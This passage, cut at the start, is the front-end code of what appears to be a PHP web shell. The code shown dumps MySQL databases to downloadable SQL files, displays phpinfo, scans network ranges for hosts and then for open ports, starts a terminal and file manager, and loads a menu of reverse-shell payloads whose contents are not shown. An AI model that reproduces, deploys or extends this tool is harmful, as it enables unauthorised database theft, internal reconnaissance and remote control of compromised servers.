var(--accent-color);">${db.service}</strong><table class="db-details-table">${Object.entries(db.details).map(([key, value]) => `<tr><td>${key}</td><td>${value.replace(/`([^`]+)`/g, '<code>$1</code>')}</td></tr>`).join('')}</table>${db.service.includes('MySQL') ? `<button class="dump-db-btn" data-service="${db.service}" data-port="${db.details['Port']}" style="margin-top:1rem">Dump</button>` : ''}</div>`).join(''); dbHtml += '</div>'; } else { dbHtml += `<p>No common database services found.</p>`; } dbHtml += '</div>'; dynamicContent.innerHTML += dbHtml; };
    G('sysinfo-refresh').addEventListener('click', loadSysInfo);
    G('sysinfo').addEventListener('click', async e => {
        if (e.target.matches('.dump-db-btn')) {
            const service = e.target.dataset.service, port = e.target.dataset.port;
            const host = prompt("DB Host", "127.0.0.1"), user = prompt("DB User", "root"), pass = prompt("DB Pass", "");
            const data = await apiRequest(buildFormData({ action: 'db_list_dbs', host, user, pass }));
            if (data && data.databases) {
                const db = prompt("Select Database:\n" + data.databases.join("\n"));
                if (db && data.databases.includes(db)) {
                    const dumpData = await apiRequest(buildFormData({ action: 'db_dump', host, user, pass, db }));
                    if (dumpData && dumpData.dump) {
                        const blob = new Blob([dumpData.dump], { type: 'text/sql' });
                        const link = document.createElement('a');
                        link.href = window.URL.createObjectURL(blob);
                        link.download = dumpData.filename;
                        link.click();
                    }
                }
            }
        }
    });
    G('phpinfo-load-btn').addEventListener('click', async (e) => { const btn = e.target, contentDiv = G('phpinfo-content'), toggleBtn = G('phpinfo-toggle-btn'); btn.disabled = true; btn.textContent = 'Loading...'; const data = await apiRequest(buildFormData({ action: 'get_phpinfo' })); if (data) { contentDiv.innerHTML = data.data; contentDiv.style.display = 'block'; btn.style.display = 'none'; toggleBtn.style.display = 'inline-block'; } else { contentDiv.innerHTML = '<p>Failed to load PHP info.</p>'; btn.disabled = false; btn.textContent = 'Show Full PHP Info'; } });
    G('phpinfo-toggle-btn').addEventListener('click', (e) => { const btn = e.target, contentDiv = G('phpinfo-content'), isVisible = contentDiv.style.display === 'block'; contentDiv.style.display = isVisible ? 'none' : 'block'; btn.textContent = isVisible ? 'Maximize' : 'Minimize'; });
    const pollScanProgress = (scan_id, onUpdate, onDone) => { const interval = setInterval(async () => { const data = await apiRequest(buildFormData({ action: 'check_scan_progress', scan_id })); if (!data) { clearInterval(interval); onDone(); return; } onUpdate(data); if (data.done) { clearInterval(interval); onDone(); } }, 1000); return interval; };
    const startBtn = G('net-scan-start-btn'), stopBtn = G('net-scan-stop-btn'); startBtn.addEventListener('click', async () => { startBtn.disabled = true; stopBtn.style.display = 'inline-block'; const data = await apiRequest(buildFormData({ action: 'start_scan', scan_type: 'network', range: G('net-scan-range').value })); if (data) { state.netScanId = data.scan_id; const resultsElem = G('net-scan-results'); resultsElem.innerHTML = ''; const progressElem = G('net-scan-progress'); progressElem.style.display = 'block'; const innerBar = progressElem.querySelector('.progress-bar-inner'); const displayedHosts = new Set(); state.netPollInterval = pollScanProgress(data.scan_id, (data) => { innerBar.style.width = `${data.progress}%`; innerBar.textContent = `${data.progress}%`; data.results.forEach(h => { if (!displayedHosts.has(h)) { resultsElem.innerHTML += `<div class="host-item"><input type="checkbox" id="host-${h}" value="${h}" checked><label for="host-${h}">${h}</label></div>`; displayedHosts.add(h); } }); }, () => { startBtn.disabled = false; stopBtn.style.display = 'none'; state.netScanId = null; if (resultsElem.innerHTML !== '') G('port-scanner-section').style.display = 'block'; }); } else { startBtn.disabled = false; stopBtn.style.display = 'none'; } });
    stopBtn.addEventListener('click', async () => { if(state.netScanId) await apiRequest(buildFormData({ action: 'stop_scan', scan_id: state.netScanId })); clearInterval(state.netPollInterval); startBtn.disabled = false; stopBtn.style.display = 'none'; G('net-scan-progress').style.display = 'none'; });
    G('port-scan-presets').addEventListener('change', e => { G('port-scan-ports').value = e.target.value; });
    const pStartBtn = G('port-scan-start-btn'), pStopBtn = G('port-scan-stop-btn'); pStartBtn.addEventListener('click', async () => { pStartBtn.disabled = true; pStopBtn.style.display = 'inline-block'; const targetIPs = Array.from(G('net-scan-results').querySelectorAll('input:checked')).map(cb => cb.value); if (targetIPs.length === 0) { showToast('No hosts selected.'); pStartBtn.disabled = false; return; } const data = await apiRequest(buildFormData({ action: 'start_scan', scan_type: 'port', ips: JSON.stringify(targetIPs), ports: G('port-scan-ports').value })); if (data) { state.portScanId = data.scan_id; const resultsElem = G('port-scan-results'); resultsElem.innerHTML = ''; const progressElem = G('port-scan-progress'); progressElem.style.display = 'block'; const innerBar = progressElem.querySelector('.progress-bar-inner'); const openPortsByIP = {}; state.portPollInterval = pollScanProgress(data.scan_id, (data) => { innerBar.style.width = `${data.progress}%`; innerBar.textContent = `${data.progress}%`; data.results.forEach(portInfo => { const [ip, port] = portInfo.split(':'); if (!openPortsByIP[ip]) openPortsByIP[ip] = new Set(); openPortsByIP[ip].add(port); }); resultsElem.innerHTML = Object.entries(openPortsByIP).map(([ip, ports]) => `<div class="section"><h2>Open Ports for ${ip}</h2><p>${Array.from(ports).sort((a,b)=>a-b).join(', ')}</p></div>`).join(''); }, () => { pStartBtn.disabled = false; pStopBtn.style.display = 'none'; state.portScanId = null; }); } else { pStartBtn.disabled = false; pStopBtn.style.display = 'none'; } });
    pStopBtn.addEventListener('click', async () => { if(state.portScanId) await apiRequest(buildFormData({ action: 'stop_scan', scan_id: state.portScanId })); clearInterval(state.portPollInterval); pStartBtn.disabled = false; pStopBtn.style.display = 'none'; G('port-scan-progress').style.display = 'none'; });
    updateTerminalPrompt();
    loadFileManager();
    G('revshell-type').innerHTML = Object.keys(revShellPayloads).map(k => `<option value="${k}">${k}</option>`).join('');
});
</script>
</body>
</html>
<?php return; ?>
/*__INTERNAL_DATA_START__*/
e30=
